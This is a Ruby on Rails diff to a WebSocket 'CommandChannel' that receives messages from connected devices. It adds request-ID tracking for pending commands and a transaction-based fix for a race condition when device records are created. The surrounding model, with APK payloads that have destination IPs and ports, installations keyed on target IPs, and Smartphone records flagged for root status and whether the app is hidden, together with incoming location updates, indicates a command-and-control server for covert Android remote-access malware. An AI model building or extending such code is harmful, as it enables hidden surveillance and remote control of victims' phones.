@@ -23,8 +23,14 @@ class CommandChannel < ApplicationCable::Channel
   def receive(data)
     message_type = data['type']
     payload = data['payload'] || data['data'] || data
+    request_id = data['request_id']
     
-    Rails.logger.info "[CommandChannel] Received '#{message_type}' from #{@device_id}"
+    Rails.logger.info "[CommandChannel] Received '#{message_type}' from #{@device_id} (request_id: #{request_id})"
+    
+    # If there's a request_id, update the PendingCommand
+    if request_id.present?
+      resolve_pending_command(request_id, message_type, payload)
+    end
     
     case message_type
     when 'device_info'
@@ -33,10 +39,11 @@ class CommandChannel < ApplicationCable::Channel
       location_update(data)
     when 'pong'
       pong(data)
-    when 'response'
+    when 'response', 'command_response'
       process_command_response(payload)
     else
-      Rails.logger.warn "[CommandChannel] Unknown message type: #{message_type}"
+      # Still resolve via request_id (handled above), just log unknown types
+      Rails.logger.info "[CommandChannel] Response type '#{message_type}' from #{@device_id}"
     end
   rescue StandardError => e
     Rails.logger.error "[CommandChannel] Error processing message: #{e.message}"
@@ -150,6 +157,24 @@ class CommandChannel < ApplicationCable::Channel
 
   private
 
+  def resolve_pending_command(request_id, response_type, payload)
+    pending = PendingCommand.find_by(request_id: request_id)
+    return unless pending && pending.pending?
+
+    Rails.logger.info "[CommandChannel] Resolving PendingCommand #{request_id} with type '#{response_type}'"
+    
+    response_data = payload.is_a?(Hash) ? payload : { 'data' => payload }
+    response_data['response_type'] = response_type
+    
+    if response_data['error'].present?
+      pending.mark_failed(response_data['error'])
+    else
+      pending.mark_completed(response_data)
+    end
+  rescue StandardError => e
+    Rails.logger.error "[CommandChannel] Error resolving command #{request_id}: #{e.message}"
+  end
+
   def register_device_online
     RedisPool.with do |redis|
       redis.sadd('online_devices', @device_id)
@@ -168,23 +193,32 @@ class CommandChannel < ApplicationCable::Channel
   end
 
   def find_or_create_smartphone
-    payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
-      apk.destination_ip = '0.0.0.0'
-      apk.destination_port = '8080'
-    end
+    # Use DB-level locking to prevent race condition on concurrent connections
+    Smartphone.transaction do
+      smartphone = Smartphone.find_by(device_id: @device_id)
+      return smartphone if smartphone
 
-    installation = ApkInstallation.find_or_create_by!(apk_payload: payload, target_ip: @device_id) do |record|
-      record.status = 'connected'
-    end
+      payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
+        apk.destination_ip = '0.0.0.0'
+        apk.destination_port = '8080'
+      end
 
-    smartphone = Smartphone.find_or_initialize_by(device_id: @device_id)
-    smartphone.apk_installation ||= installation
-    smartphone.name ||= "Device #{@device_id[0..7]}"
-    smartphone.operating_system ||= 'Android'
-    smartphone.is_rooted ||= 'Unknown'
-    smartphone.is_app_hidden ||= 'false'
-    smartphone.save!
-    smartphone
+      installation = ApkInstallation.find_or_create_by!(apk_payload: payload, target_ip: @device_id) do |record|
+        record.status = 'connected'
+      end
+
+      Smartphone.create!(
+        device_id: @device_id,
+        apk_installation: installation,
+        name: "Device #{@device_id[0..7]}",
+        operating_system: 'Android',
+        is_rooted: 'Unknown',
+        is_app_hidden: 'false'
+      )
+    end
+  rescue ActiveRecord::RecordNotUnique
+    # Lost the race — another thread created it first, just find it
+    Smartphone.find_by!(device_id: @device_id)
   end
 
   def sanitize_device_id(device_id)
